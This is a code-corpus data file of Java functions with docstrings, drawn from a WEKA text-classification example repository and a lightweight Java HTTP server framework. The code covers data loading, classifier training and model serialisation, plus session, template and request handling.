{"docstring": "/**\n\t * This method loads the text to be classified.\n\t * @param fileName The name of the file that stores the text.\n\t */\n", "func_signal": "public void load(String fileName)", "code": "{\n\t\ttry {\n\t\t\tBufferedReader reader = new BufferedReader(new FileReader(fileName));\n\t\t\tString line;\n\t\t\ttext = \"\";\n\t\t\twhile ((line = reader.readLine()) != null) {\n                text = text + \" \" + line;\n            }\n\t\t\t// System.out.println(\"===== Loaded text data: \" + fileName + \" =====\");\n\t\t\treader.close();\n\t\t\t// System.out.println(text);\n\t\t}\n\t\tcatch (IOException e) {\n\t\t\tSystem.out.println(\"Problem found when reading: \" + fileName);\n\t\t}\n\t}", "path": "OpinionMining\\SentiWordNetDemo.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method loads a dataset in ARFF format. If the file does not exist, or\n * it has a wrong format, the attribute trainData is null.\n * @param fileName The name of the file that stores the dataset.\n */\n", "func_signal": "public void loadDataset(String fileName)", "code": "{\n\ttry {\n\t\tBufferedReader reader = new BufferedReader(new FileReader(fileName));\n\t\tArffReader arff = new ArffReader(reader);\n\t\ttrainData = arff.getData();\n\t\tSystem.out.println(\"===== Loaded dataset: \" + fileName + \" =====\");\n\t\treader.close();\n\t}\n\tcatch (IOException e) {\n\t\tSystem.out.println(\"Problem found when reading: \" + fileName);\n\t}\n}", "path": "FilteredClassifier\\MyFilteredLearner.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method loads a dataset in ARFF format. If the file does not exist, or\n * it has a wrong format, the attribute instances is null.\n * @param fileName The name of the file that stores the dataset.\n */\n", "func_signal": "public void loadHeader(String fileName)", "code": "{\n\ttry {\n\t\tBufferedReader reader = new BufferedReader(new FileReader(fileName));\n\t\tArffReader arff = new ArffReader(reader);\n\t\tinstances = arff.getData();\n\t\tSystem.out.println(\"===== Loaded dataset: \" + fileName + \" =====\");\n\t\treader.close();\n\t}\n\tcatch (IOException e) {\n\t\tSystem.out.println(\"Problem found when reading: \" + fileName);\n\t}\n}", "path": "MadridJUG\\MyClassifier.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * Main method. It is an example of the usage of this class.\n * @param args Command-line arguments: csv-instance and fileModel.\n */\n", "func_signal": "public static void main (String[] args)", "code": "{\n\n\tMyClassifier classifier;\n\tif (args.length < 3) {\n\t\tSystem.out.println(\"Usage: java MyClassifier <csv-instance> <fileModel>\");\n\t\tSystem.out.println(\"Or: java MyClassifier <csv-instance> <fileModel> <fileHeader>\");\n\t\tSystem.out.println(\"Example: java MyClassifier \\\"sunny,85,85,FALSE,no\\\" myNaiveBayesModel.data\");\n\t\tSystem.out.println(\"Or: java MyClassifier \\\"sunny,85,85,FALSE,no\\\" myNaiveBayesModel.data myWeatherHeader.arff\");\n\t}\n\telse {\n\t\tclassifier = new MyClassifier();\n\t\tclassifier.loadModel(args[1]);\n\t\tclassifier.makeInstance(args[0]);\n\t\t// classifier.loadHeader(args[2]);\n\t\t// classifier.makeInstanceFromHeader(args[0]);\n\t\tclassifier.classify();\n\t}\n}", "path": "MadridJUG\\MyClassifier.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method trains the classifier on the loaded dataset.\n */\n", "func_signal": "public void learn()", "code": "{\n\ttry {\n\t\ttrainData.setClassIndex(0);\n\t\tfilter = new StringToWordVector();\n\t\tfilter.setAttributeIndices(\"last\");\n\t\tclassifier = new FilteredClassifier();\n\t\tclassifier.setFilter(filter);\n\t\tclassifier.setClassifier(new NaiveBayes());\n\t\tclassifier.buildClassifier(trainData);\n\t\t// Uncomment to see the classifier\n\t\t// System.out.println(classifier);\n\t\tSystem.out.println(\"===== Training on filtered (training) dataset done =====\");\n\t}\n\tcatch (Exception e) {\n\t\tSystem.out.println(\"Problem found when training\");\n\t}\n}", "path": "FilteredClassifier\\MyFilteredLearner.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method creates the instance to be classified, from the text that has been read.\n * @param csvInstance A CSV formatted instance of the Weather Numeric Dataset: \"sunny,85,85,FALSE\" or \"sunny,85,85,FALSE,?\"\n */\n", "func_signal": "public void makeInstance(String csvInstance)", "code": "{\n\t// Attributes are:\n\t// @attribute outlook {sunny, overcast, rainy}\n\t// @attribute temperature real\n\t// @attribute humidity real\n\t// @attribute windy {TRUE, FALSE}\n\t// @attribute play {yes, no}\n\t\n\t// Create the header\n\tList attributeList = new ArrayList(5);\n\t\n\t// Atribute \"outlook\"\n\tList values = new ArrayList(3); \n\tvalues.add(\"sunny\"); \n\tvalues.add(\"overcast\"); \n\tvalues.add(\"rainy\"); \n\tAttribute attribute = new Attribute(\"outlook\", values);\n\tattributeList.add(attribute);\n\t\n\t// Atribute \"temperature\" - default numeric\n\tattribute = new Attribute(\"temperature\");\n\tattributeList.add(attribute);\n\t\n\t// Atribute \"humidity\"\n\tattribute = new Attribute(\"humidity\");\n\tattributeList.add(attribute);\n\t\n\t// Atribute \"windy\"\n\tvalues = new ArrayList(2); \n\tvalues.add(\"TRUE\"); \n\tvalues.add(\"FALSE\"); \n\tattribute = new Attribute(\"windy\", values);\n\tattributeList.add(attribute);\n\t\n\t// Atribute \"play\"\n\tvalues = new ArrayList(2); \n\tvalues.add(\"yes\"); \n\tvalues.add(\"no\"); \n\tattribute = new Attribute(\"play\", values);\n\tattributeList.add(attribute);\n\n\t// Build instance set with just one instance\n\tinstances = new Instances(\"Test relation\", (java.util.ArrayList<Attribute>) attributeList, 1);           \n\t// Set class index\n\tinstances.setClassIndex(instances.numAttributes()-1);\n\t\n\t\n\t// Create and add the instance\n\tDenseInstance instance = new DenseInstance(5);\n\tinstance.setDataset(instances);\n\t\n\t// Assumed the instance is in CSV: \"sunny,85,85,FALSE\", class (last) undefined\n\tString[] stringValues = csvInstance.split(\",\");\n\tinstance.setValue(0, stringValues[0]);\n\tinstance.setValue(1, Integer.parseInt(stringValues[1]));\n\tinstance.setValue(2, Integer.parseInt(stringValues[2]));\n\tinstance.setValue(3, stringValues[3]);\t\t\n\tinstances.add(instance);\n\t\n \t\tSystem.out.println(\"===== Instance created with reference dataset =====\");\n\tSystem.out.println(instances);\n}", "path": "MadridJUG\\MyClassifier.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method evaluates the classifier. As recommended by WEKA documentation,\n * the classifier is defined but not trained yet. Evaluation of previously\n * trained classifiers can lead to unexpected results.\n */\n", "func_signal": "public void evaluate()", "code": "{\n\ttry {\n\t\ttrainData.setClassIndex(0);\n\t\tfilter = new StringToWordVector();\n\t\tfilter.setAttributeIndices(\"last\");\n\t\tclassifier = new FilteredClassifier();\n\t\tclassifier.setFilter(filter);\n\t\tclassifier.setClassifier(new NaiveBayes());\n\t\tEvaluation eval = new Evaluation(trainData);\n\t\teval.crossValidateModel(classifier, trainData, 4, new Random(1));\n\t\tSystem.out.println(eval.toSummaryString());\n\t\tSystem.out.println(eval.toClassDetailsString());\n\t\tSystem.out.println(\"===== Evaluating on filtered (training) dataset done =====\");\n\t}\n\tcatch (Exception e) {\n\t\tSystem.out.println(\"Problem found when evaluating\");\n\t}\n}", "path": "FilteredClassifier\\MyFilteredLearner.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method loads the model to be used as classifier.\n * @param fileName The name of the file that stores the text.\n */\n", "func_signal": "public void loadModel(String fileName)", "code": "{\n\ttry {\n\t\tObjectInputStream in = new ObjectInputStream(new FileInputStream(fileName));\n            Object tmp = in.readObject();\n\t\tclassifier = (FilteredClassifier) tmp;\n            in.close();\n \t\t\tSystem.out.println(\"===== Loaded model: \" + fileName + \" =====\");\n       } \n\tcatch (Exception e) {\n\t\t// Given the cast, a ClassNotFoundException must be caught along with the IOException\n\t\tSystem.out.println(\"Problem found when reading: \" + fileName);\n\t}\n}", "path": "OpinionMining\\SentimentClassifier.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method loads the model to be used as classifier.\n * @param fileName The name of the file that stores the model.\n */\n", "func_signal": "public void loadModel(String fileName)", "code": "{\n\ttry {\n\t\tObjectInputStream in = new ObjectInputStream(new FileInputStream(fileName));\n            Object tmp = in.readObject();\n\t\tclassifier = (NaiveBayes) tmp;\n            in.close();\n \t\t\tSystem.out.println(\"===== Loaded model: \" + fileName + \" =====\");\n       } \n\tcatch (Exception e) {\n\t\t// Given the cast, a ClassNotFoundException must be caught along with the IOException\n\t\tSystem.out.println(\"Problem found when reading: \" + fileName);\n\t}\n}", "path": "MadridJUG\\MyClassifier.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method creates the instance to be classified, from the text that has been read.\n */\n", "func_signal": "public void makeInstance()", "code": "{\n\t// Create the attributes, class and text\n\tFastVector fvNominalVal = new FastVector(2);\n\tfvNominalVal.addElement(\"spam\");\n\tfvNominalVal.addElement(\"ham\");\n\tAttribute attribute1 = new Attribute(\"class\", fvNominalVal);\n\tAttribute attribute2 = new Attribute(\"text\",(FastVector) null);\n\t// Create list of instances with one element\n\tFastVector fvWekaAttributes = new FastVector(2);\n\tfvWekaAttributes.addElement(attribute1);\n\tfvWekaAttributes.addElement(attribute2);\n\tinstances = new Instances(\"Test relation\", fvWekaAttributes, 1);           \n\t// Set class index\n\tinstances.setClassIndex(0);\n\t// Create and add the instance\n\tDenseInstance instance = new DenseInstance(2);\n\tinstance.setValue(attribute2, text);\n\t// Another way to do it:\n\t// instance.setValue((Attribute)fvWekaAttributes.elementAt(1), text);\n\tinstances.add(instance);\n \t\tSystem.out.println(\"===== Instance created with reference dataset =====\");\n\tSystem.out.println(instances);\n}", "path": "FilteredClassifier\\MyFilteredClassifier.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * Main method. It is an example of the usage of this class.\n * @param args Command-line arguments: fileData and fileModel.\n */\n", "func_signal": "public static void main (String[] args)", "code": "{\n\n\tMyFilteredClassifier classifier;\n\tif (args.length < 2)\n\t\tSystem.out.println(\"Usage: java MyClassifier <fileData> <fileModel>\");\n\telse {\n\t\tclassifier = new MyFilteredClassifier();\n\t\tclassifier.load(args[0]);\n\t\tclassifier.loadModel(args[1]);\n\t\tclassifier.makeInstance();\n\t\tclassifier.classify();\n\t}\n}", "path": "FilteredClassifier\\MyFilteredClassifier.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method saves the trained model into a file. This is done by\n * simple serialization of the classifier object.\n * @param fileName The name of the file that will store the trained model.\n */\n", "func_signal": "public void saveModel(String fileName)", "code": "{\n\ttry {\n            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(fileName));\n            out.writeObject(classifier);\n            out.close();\n \t\t\tSystem.out.println(\"===== Saved model: \" + fileName + \" =====\");\n        } \n\tcatch (IOException e) {\n\t\tSystem.out.println(\"Problem found when writing: \" + fileName);\n\t}\n}", "path": "FilteredClassifier\\MyFilteredLearner.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * Main method. It is an example of the usage of this class.\n * @param args Command-line arguments: fileData and fileModel.\n */\n", "func_signal": "public static void main (String[] args)", "code": "{\n\n\tSentimentClassifier classifier;\n\tif (args.length < 2)\n\t\tSystem.out.println(\"Usage: java SentimentClassifier <fileData> <fileModel>\");\n\telse {\n\t\tclassifier = new SentimentClassifier();\n\t\tclassifier.load(args[0]);\n\t\tclassifier.loadModel(args[1]);\n\t\tclassifier.makeInstance();\n\t\tclassifier.classify();\n\t}\n}", "path": "OpinionMining\\SentimentClassifier.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method loads the text to be classified.\n * @param fileName The name of the file that stores the text.\n */\n", "func_signal": "public void load(String fileName)", "code": "{\n\ttry {\n\t\tBufferedReader reader = new BufferedReader(new FileReader(fileName));\n\t\tString line;\n\t\ttext = \"\";\n\t\twhile ((line = reader.readLine()) != null) {\n                text = text + \" \" + line;\n            }\n\t\tSystem.out.println(\"===== Loaded text data: \" + fileName + \" =====\");\n\t\treader.close();\n\t\tSystem.out.println(text);\n\t}\n\tcatch (IOException e) {\n\t\tSystem.out.println(\"Problem found when reading: \" + fileName);\n\t}\n}", "path": "OpinionMining\\SentimentClassifier.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * Main method. It is an example of the usage of this class.\n * @param args Command-line arguments: fileData and fileModel.\n */\n", "func_signal": "public static void main (String[] args)", "code": "{\n\n\tMyFilteredLearner learner;\n\tif (args.length < 2)\n\t\tSystem.out.println(\"Usage: java MyLearner <fileData> <fileModel>\");\n\telse {\n\t\tlearner = new MyFilteredLearner();\n\t\tlearner.loadDataset(args[0]);\n\t\t// Evaluation mus be done before training\n\t\t// More info in: http://weka.wikispaces.com/Use+WEKA+in+your+Java+code\n\t\tlearner.evaluate();\n\t\tlearner.learn();\n\t\tlearner.saveModel(args[1]);\n\t}\n}", "path": "FilteredClassifier\\MyFilteredLearner.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method creates the instance to be classified, from the text that has been read.\n */\n", "func_signal": "public void makeInstance()", "code": "{\n\n\t// Create the header\n\tList attributeList = new ArrayList(2);\n\t\n\t// Create first attribute, the text\n\tAttribute attribute1 = new Attribute(\"text\",(List) null);\n\tattributeList.add(attribute1);\n\t\n\t// Create second attribute, the class\n\tList values = new ArrayList(2); \n\tvalues.add(\"no\"); \n\tvalues.add(\"yes\"); \n\tAttribute attribute2 = new Attribute(\"@@class@@\", values);\n\tattributeList.add(attribute2);\n\t\n\t// Build instance set with just one instance\n\tinstances = new Instances(\"Test relation\", (java.util.ArrayList<Attribute>) attributeList, 1);           \n\t// Set class index\n\tinstances.setClassIndex(1);\n\n\t// Create and add the instance\n\tDenseInstance instance = new DenseInstance(2);\n\tinstance.setDataset(instances);\n\tinstance.setValue(attribute1, text);\n\tinstances.add(instance);\n\t\n \t\tSystem.out.println(\"===== Instance created with reference dataset =====\");\n\tSystem.out.println(instances);\n}", "path": "OpinionMining\\SentimentClassifier.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * This method loads the model to be used as classifier.\n * @param fileName The name of the file that stores the text.\n */\n", "func_signal": "public void loadModel(String fileName)", "code": "{\n\ttry {\n\t\tObjectInputStream in = new ObjectInputStream(new FileInputStream(fileName));\n            Object tmp = in.readObject();\n\t\tclassifier = (FilteredClassifier) tmp;\n            in.close();\n \t\t\tSystem.out.println(\"===== Loaded model: \" + fileName + \" =====\");\n       } \n\tcatch (Exception e) {\n\t\t// Given the cast, a ClassNotFoundException must be caught along with the IOException\n\t\tSystem.out.println(\"Problem found when reading: \" + fileName);\n\t}\n}", "path": "FilteredClassifier\\MyFilteredClassifier.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * Main method. It is an example of the usage of this class.\n * @param args Command-line arguments: fileData and fileModel.\n */\n", "func_signal": "public static void main(String[] args)", "code": "{\n\n\tlong time1, time2;\n\tIndexTest indexer = new IndexTest();\n\tif (args.length < 2)\n\t\tSystem.out.println(\"Usage: java IndexTest <fileInput> <fileOutput>\");\n\telse {\n\t\tindexer.loadARFF(args[0]);\n\t\ttime1 = System.currentTimeMillis();\n\t\tSystem.out.println(\"Started indexing at: \" + time1);\n\t\tindexer.index();\n\t\ttime2 = System.currentTimeMillis();\n\t\tSystem.out.println(\"Finished indexing at: \" + time2);\n\t\tSystem.out.println(\"Total indexing time: \" + (time2-time1));\n\t\tindexer.saveARFF(args[1]);\n\t}\n}", "path": "WEKAExamples\\IndexTest.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * Loads an ARFF file into an instances object.\n * @param fileName The name of the file to be loaded.\n */\n", "func_signal": "public void loadARFF(String fileName)", "code": "{\n\n\ttry {\n\t\tBufferedReader reader = new BufferedReader(new FileReader(fileName));\n\t\tArffReader arff = new ArffReader(reader);\n\t\tinputInstances = arff.getData();\n\t\tSystem.out.println(\"===== Loaded dataset: \" + fileName + \" =====\");\n\t\treader.close();\n\t}\n\tcatch (IOException e) {\n\t\tSystem.out.println(\"Problem found when reading: \" + fileName);\n\t}\n}", "path": "WEKAExamples\\IndexTest.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * Main method.\n * Usage: java SentiWordNetDemo <file>\n * @param args The command line args.\n */\n", "func_signal": "public static void main (String[] args)", "code": "{\n\tSentiWordNetDemo classifier;\n\tif (args.length < 1)\n\t\tSystem.out.println(\"Usage: java SentiWordNetDemo <file>\");\n\telse {\n\t\tclassifier = new SentiWordNetDemo();\n\t\tclassifier.load(args[0]);\n\t\t// Comment the approaches you do not want to check\n\t\tSystem.out.println(classifier.classifyAllPOSY());\n\t\tSystem.out.println(classifier.classifyAllPOSN());\n\t\tSystem.out.println(classifier.classifyADJY());\n\t\tSystem.out.println(classifier.classifyADJN());\t\t\t\n\t}\n}", "path": "OpinionMining\\SentiWordNetDemo.java", "repo_name": "jmgomezh/tmweka", "stars": 64, "license": "None", "language": "java", "size": 18299}
{"docstring": "/**\n * \u83b7\u53d6sessionId\n */\n", "func_signal": "public String getSessionId(HttpExchange httpExchange)", "code": "{\n\tString cookies = httpExchange.getRequestHeaders().getFirst(\"Cookie\");\n\tString sessionId = \"\";\n\tif (StringUtil.isEmpty(cookies)) {\n\t\tcookies = httpExchange.getResponseHeaders().getFirst(\"Set-Cookie\");\n\t}\n\t\n\tif (StringUtil.isEmpty(cookies)) {\n\t\treturn null;\n\t}\n\n\tString[] cookiearry = cookies.split(\";\");\n\tfor(String cookie : cookiearry){\n\t\tcookie = cookie.replaceAll(\" \", \"\");\n\t\tif (cookie.startsWith(\"EH_SESSION=\")) {\n\t\t\tsessionId = cookie.replace(\"EH_SESSION=\", \"\").replace(\";\", \"\");\n\t\t}\n\t}\n\t\n\treturn sessionId;\n}", "path": "src\\main\\java\\org\\eh\\core\\http\\ApplicationContext.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u5904\u7406Velocity\u6a21\u677f\n * @param resultInfo\n * @return\n * @throws IOException\n */\n", "func_signal": "public String processVelocityView(ResultInfo resultInfo) throws IOException", "code": "{\n\tif (StringUtil.isEmpty(resultInfo.getView())) {\n\t\treturn \"\";\n\t}\n\n\t// \u83b7\u53d6\u8def\u5f84\n\tString path = analysisVelocityViewPath(resultInfo.getView());\n\tString content = VelocityUtil.mergeTemplate(path, resultInfo.getResultMap());\n\t\n\tif (StringUtil.isEmpty(content)) {\n\t\treturn \"\";\n\t}\n\n\treturn content;\n}", "path": "src\\main\\java\\org\\eh\\core\\web\\view\\ViewHandler.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u521d\u59cb\u5316\u4fe1\u606f\uff0c\u5e76\u542f\u52a8server\n */\n", "func_signal": "public void startServer() throws IOException", "code": "{\n\tlog.info(\"Starting EHServer......\");\n\tlog.info(\"Loading configuration......\");\n\n\t//\u8bbe\u7f6eclasses\u6587\u4ef6\u5939\u8def\u5f84\n\tConstants.CLASS_PATH = this.getClass().getResource(\"/\").getPath().replace(\"bin\", \"classes\");\n\t// \u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\n\tString propPath = Constants.CLASS_PATH + Constants.PROPERTIES_NAME;\n\tConstants.loadFromProp(propPath);\n\t\n\t\t\t\n\t// \u52a0\u8f7d\u6ce8\u89e3\u914d\u7f6e\u7684controller\n\tif (Constants.OTHER_CONFIG_INFO.get(Constants.PROPERTIES_CONTROLLER_PACKAGE) != null) {\n\t\tAnnocationHandler annocationHandler = new AnnocationHandler();\n\t\ttry {\n\t\t\tannocationHandler.paserControllerAnnocation(Constants.OTHER_CONFIG_INFO.get(\n\t\t\t\t\tConstants.PROPERTIES_CONTROLLER_PACKAGE).toString());\n\t\t} catch (Exception e) {\n\t\t\tlog.error(\"\u52a0\u8f7dcontroller\u914d\u7f6e\u51fa\u9519\uff01\", e);\n\t\t\treturn;\n\t\t}\n\t}\n\n\t// \u521d\u59cb\u5316Velocity\u6a21\u677f\n\tlog.info(\"Initializing velocity......\");\n\tVelocity.init(Constants.CLASS_PATH\n\t\t\t+ Constants.PROPERTIES_VELOCITY_NAME);\n\n\tfor (String key : Constants.UrlClassMap.keySet()) {\n\t\tlog.info(\"Add url-class:\" + key + \"  \" + Constants.UrlClassMap.get(key));\n\t}\n\n\tint port = 8899;\n\t//\u8bbe\u7f6e\u7aef\u53e3\u53f7\n\tString portValue = Constants.OTHER_CONFIG_INFO.get(Constants.PROPERTIES_HPPTSERVER_PORT);\n\tlog.info(\"Set port:\" + portValue);\n\tif (portValue != null) {\n\t\ttry {\n\t\t\tport = Integer.parseInt(portValue);\n\t\t} catch (Exception e) {\n\t\t\tlog.error(\"\u7aef\u53e3\u9519\u8bef\uff01\", e);\n\t\t\treturn;\n\t\t}\n\t}\n\t\n\t//\u542f\u52a8session\u8fc7\u671f\u6e05\u7406\u5b9a\u65f6\u5668\n\tTimer timer = new Timer();\n\tSessionCleanTask sessionCleanTask = new SessionCleanTask();\n\tint session_timeout = Integer.parseInt(Constants.OTHER_CONFIG_INFO\n\t\t\t.get(Constants.SESSION_TIMEOUT));\n\tlog.info(\"Initializing SessionCleanTask,the session_out_time is \" + session_timeout * 2\n\t\t\t+ \" minute.\");\n\ttimer.schedule(sessionCleanTask, new Date(), session_timeout * 30 * 1000);\n\n\t// \u542f\u52a8\u670d\u52a1\u5668\n\tHttpServerProvider provider = HttpServerProvider.provider();\n\tHttpServer httpserver = provider.createHttpServer(new InetSocketAddress(port), 100);\n\thttpserver.createContext(\"/\", new EHHttpHandler());\n\thttpserver.setExecutor(null);\n\thttpserver.start();\n\tlog.info(\"EHServer has started\");\n}", "path": "src\\main\\java\\org\\eh\\core\\http\\EHServer.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u89e3\u6790\u8def\u5f84\uff08\u6839\u636eController\u8fd4\u56deResultInfo\u7684view\uff09,\u5df2\u5e9f\u5f03\n * @param viewPath\n * @return\n */\n", "func_signal": "@Deprecated\nprivate String analysisViewPath(String viewPath)", "code": "{\n\tString path = Constants.CLASS_PATH\n\t\t\t+ (Constants.VIEW_BASE_PATH == null ? \"/\" : Constants.VIEW_BASE_PATH)\n\t\t\t+ viewPath + \".page\";\n\treturn path;\n}", "path": "src\\main\\java\\org\\eh\\core\\web\\view\\ViewHandler.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "// \u7528\u4e8e\u4ece\u4e00\u4e2a\u5b57\u8282\u6570\u7ec4\u4e2d\u63d0\u53d6\u4e00\u4e2a\u5b57\u8282\u6570\u7ec4\n", "func_signal": "public static byte[] subBytes(byte[] b, int from, int end)", "code": "{\n\tbyte[] result = new byte[end - from];\n\tSystem.arraycopy(b, from, result, 0, end - from);\n\treturn result;\n}", "path": "src\\main\\java\\org\\eh\\core\\util\\FileUploadContentAnalysis.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u8bbe\u7f6esession\u6700\u540e\u8bbf\u95ee\u65f6\u95f4\n */\n", "func_signal": "public void setSessionLastTime(String sessionId)", "code": "{\n\tHttpSession httpSession = ApplicationContextHolder.instance.sessionMap.get(sessionId);\n\thttpSession.setLastVisitTime(new Date());\n}", "path": "src\\main\\java\\org\\eh\\core\\http\\ApplicationContext.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u89e3\u6790\u53c2\u6570\n */\n", "func_signal": "private Map<String, Object> analysisParms(HttpExchange httpExchange)\n\t\tthrows UnsupportedEncodingException", "code": "{\n\tMap<String, Object> map = new HashMap<String, Object>();\n\n\tURI requestedUri = httpExchange.getRequestURI();\n\tString queryGet = requestedUri.getRawQuery();\n\tString queryPost = IOUtil.getRequestContent(httpExchange.getRequestBody());\n\tString query = \"\";\n\tif (!StringUtil.isEmpty(queryGet)) {\n\t\tquery = queryGet;\n\t}\n\tif (!StringUtil.isEmpty(queryPost)) {\n\t\tquery = StringUtil.isEmpty(query) ? queryPost : (query + \"&\" + queryPost);\n\t}\n\tif (StringUtil.isEmpty(query)) {\n\t\treturn map;\n\t}\n\n\tfor (String kv : query.split(\"&\")) {\n\t\tString[] temp = kv.split(\"=\");\n\t\tmap.put(temp[0], URLDecoder.decode(temp[1], \"utf-8\"));\n\t}\n\treturn map;\n}", "path": "src\\main\\java\\org\\eh\\core\\http\\EHHttpHandler.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "// \u670d\u52a1\u7aef\u53e3\u540d\n", "func_signal": "public static void loadFromProp(String path)", "code": "{\n\t\tMap<String, String> map = new HashMap<String, String>();\n\t\ttry {\n\t\t\tmap = PropertyUtil.analysisProperties(path);\n\t\t} catch (Exception e) {\n\t\t\tlog.error(\"\u914d\u7f6e\u6587\u4ef6\u4e0d\u5b58\u5728\uff01\", e);\n\t\t}\n\n\t\tfor (String key : map.keySet()) {\n\t\t\tif (key.equals(\"PACKAGE_PREFIX\")) {\n\t\t\t\tPACKAGE_PREFIX = map.get(key).toString();\n\t\t\t} else if (key.equals(\"VIEW_BASE_PATH\")) {\n\t\t\t\tVIEW_BASE_PATH = map.get(key).toString();\n\t\t\t} else if (key.startsWith(\"url\")) {\n\t\t\t\tUrlClassMap.put(key.replace(\"url\", \"\"), map.get(key).toString());\n\t\t\t} else {\n\t\t\t\tOTHER_CONFIG_INFO.put(key, map.get(key).toString());\n\t\t\t}\n\t\t}\n\t}", "path": "src\\main\\java\\org\\eh\\core\\common\\Constants.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u6e32\u67d3Velocity\u6a21\u677f\n * @param path\n * @param map\n */\n", "func_signal": "public static String mergeTemplate(String path, Map<String, Object> map) throws IOException", "code": "{\n\tVelocityContext vc = new VelocityContext();\n\tif (null != map) {\n\t\tfor (String key : map.keySet()) {\n\t\t\tvc.put(key, map.get(key));\n\t\t}\n\t}\n\tStringWriter w = new StringWriter();\n\tVelocity.mergeTemplate(path, \"utf-8\", vc, w);\n\tString content = w.toString();\n\tw.close();\n\treturn content;\n}", "path": "src\\main\\java\\org\\eh\\core\\util\\VelocityUtil.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * Controller\u6ce8\u89e3\n * @author guojing\n * @date 2014-3-5\n */\n", "func_signal": "@Retention(RetentionPolicy.RUNTIME)\n@Target(ElementType.TYPE)\n@Documented\npublic @interface Controller", "code": "{\n\n\t/**\n\t * controller\u540d\uff0c\u6682\u65f6\u65e0\u7528\n\t */\n\tpublic String name();\n\n\t/**\n\t * \u5bf9\u5e94url\u8bf7\u6c42\u8def\u5f84\uff0c\u5982htp://127.0.0.1/test/list.do \u5219\u5bf9\u5e94 controller\u4e3a\uff1a/test/\uff0c\u5bf9\u5e94\u65b9\u6cd5\u4e3a\uff1alist\n\t */\n\tpublic String url();\n}", "path": "src\\main\\java\\org\\eh\\core\\annotation\\Controller.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u83b7\u53d6\u6307\u5b9a\u5305\u4e0b\u7684\u6240\u6709\u7c7b\u540d\uff08\u5305\u542b\u5305\u540d\uff09\n * @param parkage \u6307\u5b9a\u5305\u540d\n * @return\n */\n", "func_signal": "public List<String> getPkgClass(String parkage)", "code": "{\n\tString path = Constants.CLASS_PATH + parkage.replace(\".\", \"/\") + \"/\";\n\tList<String> list = new ArrayList<String>();\n\n\tFile file = new File(path);\n\tfor (String str : file.list()) {\n\t\tif (str.endsWith(\".class\")) {\n\t\t\tlist.add(parkage + \".\" + str.replace(\".class\", \"\"));\n\t\t} else if (str.indexOf(\".\") == -1) {\n\t\t\tlist.addAll(getPkgClass(parkage + \".\" + str));\n\t\t}\n\t}\n\n\treturn list;\n}", "path": "src\\main\\java\\org\\eh\\core\\annotation\\AnnocationHandler.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
